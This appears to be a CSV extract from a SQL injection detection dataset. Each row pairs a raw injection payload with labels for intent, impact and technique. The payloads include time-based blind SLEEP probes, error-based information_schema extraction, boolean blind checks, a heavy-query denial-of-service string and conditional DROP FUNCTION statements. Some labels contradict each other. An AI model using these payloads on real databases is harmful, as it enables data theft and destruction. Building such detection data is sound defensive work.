row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
10220,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #","1' IN BOOLEAN MODE ) OR CHAR ( 117 ) ||CHAR ( 111 ) ||CHAR ( 105 ) ||CHAR ( 100 ) = REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
3827,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'","1'+ ( SELECT 'ALIZ' WHERE 5050 = 5050 OR 4411 = ( SELECT COUNT ( * ) FROM SYSUSERS AS SYS1,SYSUSERS AS SYS2,SYSUSERS AS SYS3,SYSUSERS AS SYS4,SYSUSERS AS SYS5,SYSUSERS AS SYS6,SYSUSERS AS SYS7 ) ) +'",injection_fragment,UNKNOWN,sysusers,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,sysusers,3
8020,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --","1' ) AS BVVL WHERE 9818 = 9818 AND ( SELECT 9067 FROM ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 9067 = 9067,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY X ) A ) --",injection_fragment,UNKNOWN,character_sets,9067,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,schema_enumeration_fragment,confidentiality,False,True,False,True,False,True,False,True,False,False,character_sets,3
7209,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm","1' AND ELT ( 3247 = 3969,3969 ) AND 'XCBM' LIKE 'XCBM",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
5379,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,IF ( 8995 = 9787 ) SELECT 8995 ELSE DROP FUNCTION OFGG--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5304,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4135  =  2165  )   select 4135 else drop function otyy--,IF ( 4135 = 2165 ) SELECT 4135 ELSE DROP FUNCTION OTYY--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
3508,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #","1"" OR ELT ( 5873 = 5873,SLEEP ( 5 ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
30209,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,FROM  ( SELECT DISTINCT sit FROM create ),FROM ( SELECT DISTINCT SIT FROM CREATE ),injection_fragment,UNKNOWN,"create, ( select distinct sit from create )",sit,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,False,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,subquery_fragment,availability/integrity,False,True,False,False,False,False,False,True,False,False,create,3
3691,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895","1 ) ) AND ELT ( 9288 = 6067,6067 ) AND ( ( 1895 = 1895",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
6640,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #","1%"" OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
